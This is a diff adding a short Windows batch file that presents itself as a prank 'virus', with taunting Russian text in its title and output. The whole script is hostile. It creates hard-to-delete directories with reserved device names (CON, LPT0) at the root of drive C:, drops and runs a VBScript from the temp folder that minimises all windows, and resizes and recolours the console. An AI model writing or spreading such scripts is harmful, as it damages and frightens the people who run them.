@@ -1,0 +1,13 @@
+@echo off
+title Я в тебе)))
+type Вирус у тебя)
+md \\?\C:\CON
+md \\?\C:\LPT0
+Echo on error resume next > %TEMP%\s3.vbs
+Echo Set S = CreateObject("Wscript.Shell") >> %TEMP%\s3.vbs
+Echo set FSO=createobject("scripting.filesystemobject") >> %TEMP%\s3.vbs
+Echo set application=createobject("shell.application") >> %TEMP%\s3.vbs
+Echo application.minimizeall >> %TEMP%\s3.vbs
+%TEMP%\s3.vbs
+mode con cols=300 lines=300
+color 0A
